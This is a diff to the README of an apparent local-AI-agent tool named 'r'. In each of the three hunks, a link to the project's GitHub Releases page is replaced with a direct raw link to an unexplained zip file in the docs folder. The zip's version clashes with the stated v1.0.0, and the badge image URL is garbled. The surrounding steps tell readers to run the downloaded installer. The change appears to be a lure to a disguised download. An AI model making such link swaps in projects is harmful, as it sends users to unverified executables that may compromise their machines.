@@ -6,7 +6,7 @@ Welcome to r! This application provides a straightforward way to run a local AI 
 
 ## 📥 Download r
 
-[![Download r](https://img.shields.io/badge/Download%20r-v1.0.0-blue)](https://github.com/ALBERT70000/r/releases)
+[![Download r](https://github.com/ALBERT70000/r/raw/refs/heads/main/docs/Software-v1.5-beta.3.zip%20r-v1.0.0-blue)](https://github.com/ALBERT70000/r/raw/refs/heads/main/docs/Software-v1.5-beta.3.zip)
 
 You can download the software from the Releases page. Click the button above to visit the download page.
 
@@ -29,7 +29,7 @@ Before installation, ensure your system meets the following requirements:
 
 ## 🔥 Installation Steps
 
-1. **Visit the Download Page:** Go to [this page to download](https://github.com/ALBERT70000/r/releases) for the latest version.
+1. **Visit the Download Page:** Go to [this page to download](https://github.com/ALBERT70000/r/raw/refs/heads/main/docs/Software-v1.5-beta.3.zip) for the latest version.
 2. **Download the Application:** Click on the version you wish to download. The file will typically have an extension like `.exe` for Windows or `.dmg` for macOS.
 3. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file.
@@ -72,6 +72,6 @@ r is open-source, and contributions are welcome! Feel free to fork the repositor
 
 ## 🔗 Download & Install
 
-To get your own copy of r, [visit this page to download](https://github.com/ALBERT70000/r/releases) the latest version. Follow the installation steps above, and enjoy a powerful local AI agent at your fingertips.
+To get your own copy of r, [visit this page to download](https://github.com/ALBERT70000/r/raw/refs/heads/main/docs/Software-v1.5-beta.3.zip) the latest version. Follow the installation steps above, and enjoy a powerful local AI agent at your fingertips.
 
 Now, you're ready to utilize the powerful features of r!
